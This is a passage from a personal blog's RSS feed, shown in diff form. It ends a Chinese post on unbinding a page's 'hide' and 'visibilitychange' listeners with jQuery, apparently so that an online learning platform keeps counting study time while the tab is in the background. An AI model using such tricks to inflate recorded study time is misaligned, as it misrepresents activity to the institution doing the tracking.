-&lt;p&gt;很简单，只要把绑定在 document 上 &lt;code&gt;hide&lt;/code&gt; 事件的监听器取消掉就好了。&lt;/p&gt;
-&lt;p&gt;然而其实还有另一个监听器（虽然没找到代码在哪里）：&lt;code&gt;visibilitychange&lt;/code&gt;，通过 Chrome 的 F12 可以找到：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2022/07/1234198249.png&quot; alt=&quot;Chrome 的 F12 工具可以看到监听器&quot;&gt;&lt;/p&gt;
-&lt;p&gt;用 jQuery 的 &lt;code&gt;off()&lt;/code&gt; 可以解绑这俩监听器：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;$(document).off(&apos;hide&apos;);
-$(document).off(&apos;visibilitychange&apos;);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;大功告成！&lt;/p&gt;
-&lt;h2&gt;遗留问题&lt;/h2&gt;
-&lt;p&gt;好像如果把页面放在后台，这个学习时间的计时会慢一点，过了 15min 它好像只记了 9min。猜测可能和 Chrome 的后台节省内存的机制有关？&lt;/p&gt;
 </content:encoded><author>me@skywt.cn</author></item><item><title>感谢订阅 SkyWT 的博客。</title><link>https://skywt.cn/blog/</link><guid isPermaLink="true">https://skywt.cn/blog/</guid><description>订阅成功。</description><pubDate>Wed, 01 Nov 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;订阅成功。该 RSS 源显示最近发布的 20 篇文章。当有新文章时，RSS 源会及时更新。&lt;/p&gt;
 &lt;p&gt;前往&lt;a href=&quot;https://skywt.cn/blog/archives&quot;&gt;文章归档&lt;/a&gt;页面即可一览全部文章。&lt;/p&gt;
 &lt;p&gt;RSS 真是个伟大的发明，用开放的标准将独立的内容连接在一起，也将我们连接在一起。&lt;/p&gt;
